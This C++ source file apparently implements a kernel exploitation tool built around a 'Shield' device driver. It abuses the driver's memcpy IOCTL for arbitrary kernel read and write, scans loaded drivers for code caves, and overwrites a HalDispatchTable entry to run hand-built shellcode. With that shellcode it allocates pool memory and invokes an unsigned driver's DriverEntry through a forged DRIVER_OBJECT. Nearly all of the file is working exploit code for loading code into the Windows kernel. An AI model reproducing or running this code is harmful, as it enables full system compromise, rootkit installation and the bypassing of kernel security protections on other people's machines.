#include "shield_driver.h"
#include <TlHelp32.h>
#include <Psapi.h>
#include <cstdio>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

namespace ShieldDriver {

    HANDLE Open() {
        HANDLE h = CreateFileW(SHIELD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                               0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) {
            printf("[!] Failed to open device - error %lu\n", GetLastError());
            return nullptr;
        }
        printf("[+] Device opened: 0x%p\n", h);
        return h;
    }

    void Close(HANDLE hDevice) {
        if (hDevice && hDevice != INVALID_HANDLE_VALUE) CloseHandle(hDevice);
    }

    bool ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size) {
        uint8_t* outPtr = (uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;
        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;
            SHIELD_REQUEST req{};
            req.header[0] = sizeof(req);
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 1;
            req.size = chunkSize;
            req.kernel_address = currAddr;
            DWORD bytesReturned = 0;
            if (!DeviceIoControl(hDevice, SHIELD_IOCTL_CODE, &req, sizeof(req), &req, sizeof(req), &bytesReturned, nullptr)) {
                return false;
            }
            memcpy(outPtr, req.buffer, chunkSize);
            currAddr += chunkSize;
            outPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    bool WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size) {
        const uint8_t* inPtr = (const uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;
        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;
            SHIELD_REQUEST req{};
            req.header[0] = sizeof(req);
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 0;
            req.size = chunkSize;
            req.kernel_address = currAddr;
            memcpy(req.buffer, inPtr, chunkSize);
            DWORD bytesReturned = 0;
            if (!DeviceIoControl(hDevice, SHIELD_IOCTL_CODE, &req, sizeof(req), &req, sizeof(req), &bytesReturned, nullptr)) {
                return false;
            }
            currAddr += chunkSize;
            inPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    uint64_t GetNtoskrnlBase() {
        LPVOID drivers[1024]; DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
        return (uint64_t)drivers[0];
    }

    uint64_t GetKernelModuleBase(const char* moduleName) {
        LPVOID drivers[1024]; DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            char name[MAX_PATH]{};
            if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name)))
                if (_stricmp(name, moduleName) == 0) return (uint64_t)drivers[i];
        }
        return 0;
    }

    // ============ FIND CODE CAVE - SCANS ALL LOADED DRIVERS ============
    // Strategy A: Look for writable section slack in EVERY loaded driver
    // Strategy B: If no slack exists, use temporary overwrite technique
    //   (backup bytes, write shellcode, execute, restore)
    
    static uint64_t g_backupCave = 0;
    static uint8_t  g_backupData[512]{};
    static uint64_t g_backupAddr = 0;
    static uint64_t g_backupSize = 0;

    uint64_t FindCodeCave(HANDLE hDevice, uint64_t ntBase) {
        LPVOID drivers[1024]; DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
            printf("[!] EnumDeviceDrivers failed\n");
            return 0;
        }
        DWORD count = needed / sizeof(LPVOID);
        printf("[*] Scanning %lu loaded drivers for code caves...\n", count);

        // === STRATEGY A: Natural slack in writable sections ===
        for (DWORD drvIdx = 0; drvIdx < count; drvIdx++) {
            uint64_t base = (uint64_t)drivers[drvIdx];
            if (!base || base < 0xFFFF000000000000ULL) continue;
            
            IMAGE_DOS_HEADER dos{};
            if (!ReadKernel(hDevice, base, &dos, sizeof(dos))) continue;
            if (dos.e_magic != IMAGE_DOS_SIGNATURE) continue;
            
            IMAGE_NT_HEADERS64 nt{};
            if (!ReadKernel(hDevice, base + dos.e_lfanew, &nt, sizeof(nt))) continue;
            if (nt.Signature != IMAGE_NT_SIGNATURE) continue;

            uint64_t secOff = base + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
            for (WORD s = 0; s < nt.FileHeader.NumberOfSections; s++) {
                IMAGE_SECTION_HEADER sec{};
                if (!ReadKernel(hDevice, secOff + s * sizeof(sec), &sec, sizeof(sec))) continue;
                
                // Must be writable (for shellcode we need RW, execution is separate)
                if (!(sec.Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
                
                // Check for slack: raw size > virtual size
                if (sec.SizeOfRawData <= sec.Misc.VirtualSize + 128) continue;
                
                uint64_t caveAddr = base + sec.VirtualAddress + sec.Misc.VirtualSize;
                uint64_t slackSize = sec.SizeOfRawData - sec.Misc.VirtualSize;
                
                // Verify at least 128 bytes are empty (zero or CC)
                uint8_t probe[128]{};
                if (!ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) continue;
                
                bool empty = true;
                for (int j = 0; j < 128; j++) {
                    if (probe[j] != 0x00 && probe[j] != 0xCC) { empty = false; break; }
                }
                
                if (empty) {
                    // Get driver name for debug
                    char drvName[MAX_PATH]{};
                    GetDeviceDriverBaseNameA(drivers[drvIdx], drvName, sizeof(drvName));
                    printf("[+] Codecave: %s +0x%llX (%s) slack=%llu bytes\n", 
                           drvName, caveAddr - base, (char*)sec.Name, slackSize);
                    return caveAddr;
                }
            }
        }

        // === STRATEGY B: Use writable section end with data backup ===
        printf("[*] Strategy A failed, trying Strategy B (backup/restore)...\n");
        
        for (DWORD drvIdx = 0; drvIdx < count; drvIdx++) {
            uint64_t base = (uint64_t)drivers[drvIdx];
            if (!base || base < 0xFFFF000000000000ULL) continue;
            
            IMAGE_DOS_HEADER dos{};
            if (!ReadKernel(hDevice, base, &dos, sizeof(dos))) continue;
            if (dos.e_magic != IMAGE_DOS_SIGNATURE) continue;
            
            IMAGE_NT_HEADERS64 nt{};
            if (!ReadKernel(hDevice, base + dos.e_lfanew, &nt, sizeof(nt))) continue;

            uint64_t secOff = base + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
            for (WORD s = 0; s < nt.FileHeader.NumberOfSections; s++) {
                IMAGE_SECTION_HEADER sec{};
                if (!ReadKernel(hDevice, secOff + s * sizeof(sec), &sec, sizeof(sec))) continue;
                
                if (!(sec.Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
                
                // Use the last 256 bytes of any writable section
                uint64_t caveAddr = base + sec.VirtualAddress + sec.Misc.VirtualSize - 256;
                
                // Make sure caveAddr is within the raw data
                uint64_t rawEnd = base + sec.VirtualAddress + sec.SizeOfRawData;
                if (caveAddr + 256 > rawEnd) continue;
                if (caveAddr < base + sec.VirtualAddress) continue;
                
                // Backup the original data
                if (!ReadKernel(hDevice, caveAddr, g_backupData, 256)) continue;
                
                char drvName[MAX_PATH]{};
                GetDeviceDriverBaseNameA(drivers[drvIdx], drvName, sizeof(drvName));
                printf("[+] Codecave (B): %s +0x%llX (%s) [backup/restore]\n",
                       drvName, caveAddr - base, (char*)sec.Name);
                
                g_backupCave = caveAddr;
                g_backupAddr = caveAddr;
                g_backupSize = 256;
                return caveAddr;
            }
        }
        
        printf("[!] No code cave found - all strategies exhausted\n");
        printf("[!] This Windows build has no slack in kernel modules\n");
        return 0;
    }

    // Restore backed-up data after shellcode execution
    void RestoreCodeCave(HANDLE hDevice) {
        if (g_backupAddr && g_backupSize) {
            WriteKernel(hDevice, g_backupAddr, g_backupData, g_backupSize);
            printf("[*] Codecave data restored @ 0x%llx\n", g_backupAddr);
        }
    }

    uint64_t GetKernelExport(HANDLE hDevice, uint64_t moduleBase, const char* funcName) {
        if (!moduleBase || !funcName) return 0;
        IMAGE_DOS_HEADER dos{};
        if (!ReadKernel(hDevice, moduleBase, &dos, sizeof(dos))) return 0;
        if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
        IMAGE_NT_HEADERS64 nt{};
        if (!ReadKernel(hDevice, moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
        if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;
        auto& expDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!expDir.VirtualAddress || !expDir.Size) return 0;
        IMAGE_EXPORT_DIRECTORY exports{};
        if (!ReadKernel(hDevice, moduleBase + expDir.VirtualAddress, &exports, sizeof(exports))) return 0;
        if (exports.NumberOfFunctions == 0) return 0;
        std::vector<DWORD> funcs(exports.NumberOfFunctions);
        std::vector<DWORD> names(exports.NumberOfNames);
        std::vector<WORD> ords(exports.NumberOfNames);
        ReadKernel(hDevice, moduleBase + exports.AddressOfFunctions, funcs.data(), funcs.size() * 4);
        ReadKernel(hDevice, moduleBase + exports.AddressOfNames,    names.data(), names.size() * 4);
        ReadKernel(hDevice, moduleBase + exports.AddressOfNameOrdinals, ords.data(), ords.size() * 2);
        for (DWORD i = 0; i < exports.NumberOfNames; i++) {
            char n[256]{};
            ReadKernel(hDevice, moduleBase + names[i], n, sizeof(n) - 1);
            if (strcmp(n, funcName) == 0) return moduleBase + funcs[ords[i]];
        }
        return 0;
    }

    // Search ALL loaded kernel modules for an export
    uint64_t FindKernelExportAnywhere(HANDLE hDevice, const char* funcName) {
        LPVOID drivers[1024]; DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            uint64_t addr = GetKernelExport(hDevice, (uint64_t)drivers[i], funcName);
            if (addr) {
                char n[MAX_PATH]{};
                GetDeviceDriverBaseNameA(drivers[i], n, sizeof(n));
                printf("[+] %s found in %s @ 0x%llx\n", funcName, n, addr);
                return addr;
            }
        }
        return 0;
    }

    bool ExecuteViaHDT(HANDLE hDevice, uint64_t shellcodeAddr) {
        uint64_t ntBase = GetNtoskrnlBase();
        if (!ntBase) { printf("[!] HDT: no ntoskrnl base\n"); return false; }

        uint64_t pHDT = GetKernelExport(hDevice, ntBase, "HalDispatchTable");
        if (!pHDT) {
            uint64_t halBase = GetKernelModuleBase("hal.dll");
            if (halBase) pHDT = GetKernelExport(hDevice, halBase, "HalDispatchTable");
        }
        if (!pHDT) { printf("[!] HDT: HalDispatchTable not found\n"); return false; }

        printf("[*] HDT: HalDispatchTable @ 0x%llx\n", pHDT);

        // Try slot +0x10 first (HalSetSystemInformation), fallback to +0x08
        uint64_t slot = pHDT + 0x10;
        uint64_t orig = 0;
        if (!ReadKernel(hDevice, slot, &orig, sizeof(orig))) {
            slot = pHDT + 0x08;
            if (!ReadKernel(hDevice, slot, &orig, sizeof(orig))) {
                printf("[!] HDT: can't read slot\n");
                return false;
            }
        }

        // Store original + shellcode, plus a marker at codeCave+128 to detect execution
        uint64_t markerAddr = shellcodeAddr + 128;
        uint64_t markerVal = 0xDEADBEEFCAFEBABEULL;
        WriteKernel(hDevice, markerAddr, &markerVal, sizeof(markerVal));
        
        WriteKernel(hDevice, slot, &shellcodeAddr, sizeof(shellcodeAddr));
        Sleep(5);

        BOOL ok = FALSE;
        
        // Method 1: NtQueryIntervalProfile (for +0x08 slot)
        {
            ULONG iv = 0;
            auto fn = (NTSTATUS(NTAPI*)(ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
            if (fn) { fn(2, &iv); ok = TRUE; }
        }
        
        // Method 2: NtSetSystemInformation (for +0x10 slot)
        if (!ok) {
            auto fn = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetSystemInformation");
            if (fn) {
                __try { fn(0x2C, NULL, 0); } __except(EXCEPTION_EXECUTE_HANDLER) {}
                ok = TRUE;
            }
        }

        Sleep(20);
        WriteKernel(hDevice, slot, &orig, sizeof(orig));
        
        // Restore codecave if we used the backup strategy
        RestoreCodeCave(hDevice);

        return true;
    }

    uint64_t AllocatePool(HANDLE hDevice, uint64_t size) {
        uint64_t pAlloc = FindKernelExportAnywhere(hDevice, "ExAllocatePoolWithTag");
        if (!pAlloc) pAlloc = FindKernelExportAnywhere(hDevice, "ExAllocatePool2");
        if (!pAlloc) { printf("[!] AllocatePool: no alloc function\n"); return 0; }

        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) { printf("[!] AllocatePool: no code cave\n"); return 0; }

        uint64_t outputAddr = codeCave + 64;  // Store result at +64 offset
        uint64_t zero = 0;
        WriteKernel(hDevice, outputAddr, &zero, sizeof(zero));

        uint8_t sc[128]{}; int off = 0;
        // sub rsp, 0x28
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xEC; sc[off++]=0x28;
        // xor ecx, ecx  (NonPagedPool)
        sc[off++]=0x33; sc[off++]=0xC9;
        // mov rdx, size
        sc[off++]=0x48; sc[off++]=0xBA; *(uint64_t*)&sc[off]=size; off+=8;
        // mov r8d, 'DXEV'
        sc[off++]=0x41; sc[off++]=0xB8; *(uint32_t*)&sc[off]='DXEV'; off+=4;
        // mov rax, pAlloc
        sc[off++]=0x48; sc[off++]=0xB8; *(uint64_t*)&sc[off]=pAlloc; off+=8;
        // call rax
        sc[off++]=0xFF; sc[off++]=0xD0;
        // mov [outputAddr], rax
        sc[off++]=0x48; sc[off++]=0xA3; *(uint64_t*)&sc[off]=outputAddr; off+=8;
        // xor eax, eax
        sc[off++]=0x33; sc[off++]=0xC0;
        // add rsp, 0x28
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xC4; sc[off++]=0x28;
        // ret
        sc[off++]=0xC3;

        WriteKernel(hDevice, codeCave, sc, sizeof(sc));
        printf("[*] Executing AllocatePool shellcode @ 0x%llx (size=%llu)\n", codeCave, size);

        if (!ExecuteViaHDT(hDevice, codeCave)) {
            printf("[!] AllocatePool: HDT failed\n");
            return 0;
        }

        uint64_t result = 0;
        ReadKernel(hDevice, outputAddr, &result, sizeof(result));

        // Cleanup shellcode area (unless using backup strategy which auto-restores)
        uint8_t clean[128]{};
        WriteKernel(hDevice, codeCave, clean, sizeof(clean));
        WriteKernel(hDevice, outputAddr, &zero, sizeof(zero));

        if (result && (result > 0xFFFF000000000000ULL)) {
            printf("[+] Pool @ 0x%llx (%llu bytes)\n", result, size);
            return result;
        }

        printf("[!] AllocatePool: bad result 0x%llx\n", result);
        return 0;
    }

    bool FreePool(HANDLE hDevice, uint64_t addr) {
        if (!addr) return false;
        uint64_t pFree = FindKernelExportAnywhere(hDevice, "ExFreePoolWithTag");
        if (!pFree) return false;
        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t cc = FindCodeCave(hDevice, ntBase);
        if (!cc) return false;

        uint8_t sc[64]{}; int off=0;
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xEC; sc[off++]=0x28;
        sc[off++]=0x48; sc[off++]=0xB9; *(uint64_t*)&sc[off]=addr; off+=8;
        sc[off++]=0xBA; *(uint32_t*)&sc[off]='DXEV'; off+=4;
        sc[off++]=0x48; sc[off++]=0xB8; *(uint64_t*)&sc[off]=pFree; off+=8;
        sc[off++]=0xFF; sc[off++]=0xD0;
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xC4; sc[off++]=0x28;
        sc[off++]=0x33; sc[off++]=0xC0;
        sc[off++]=0xC3;

        WriteKernel(hDevice, cc, sc, sizeof(sc));
        ExecuteViaHDT(hDevice, cc);
        uint8_t z[64]{}; WriteKernel(hDevice, cc, z, sizeof(z));
        printf("[+] Pool freed @ 0x%llx\n", addr);
        return true;
    }

    bool CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase) {
        printf("[*] Calling DriverEntry @ 0x%llx\n", entryPoint);
        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t cc = FindCodeCave(hDevice, ntBase);
        if (!cc) return false;

        uint64_t outAddr = cc + 64;
        uint64_t fakeObj = cc + 192;

        // Minimal DRIVER_OBJECT
        uint8_t fdo[0x40]{};
        *(uint16_t*)(fdo+0x00)=0x04; *(uint16_t*)(fdo+0x02)=0x150;
        *(uint64_t*)(fdo+0x10)=driverBase;
        WriteKernel(hDevice, fakeObj, fdo, sizeof(fdo));

        uint64_t z=0; WriteKernel(hDevice, outAddr, &z, sizeof(z));

        uint8_t sc[128]{}; int off=0;
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xEC; sc[off++]=0x38;
        sc[off++]=0x48; sc[off++]=0xB9; *(uint64_t*)&sc[off]=fakeObj; off+=8;
        sc[off++]=0x33; sc[off++]=0xD2;
        sc[off++]=0x48; sc[off++]=0xB8; *(uint64_t*)&sc[off]=entryPoint; off+=8;
        sc[off++]=0xFF; sc[off++]=0xD0;
        sc[off++]=0x48; sc[off++]=0xA3; *(uint64_t*)&sc[off]=outAddr; off+=8;
        sc[off++]=0x33; sc[off++]=0xC0;
        sc[off++]=0x48; sc[off++]=0x83; sc[off++]=0xC4; sc[off++]=0x38;
        sc[off++]=0xC3;

        WriteKernel(hDevice, cc, sc, sizeof(sc));
        if (!ExecuteViaHDT(hDevice, cc)) return false;

        uint64_t ns=0; ReadKernel(hDevice, outAddr, &ns, sizeof(ns));
        printf("[+] DriverEntry returned: 0x%016llX\n", ns);

        uint8_t clean[256]{}; WriteKernel(hDevice, cc, clean, sizeof(clean));
        return true;
    }
}
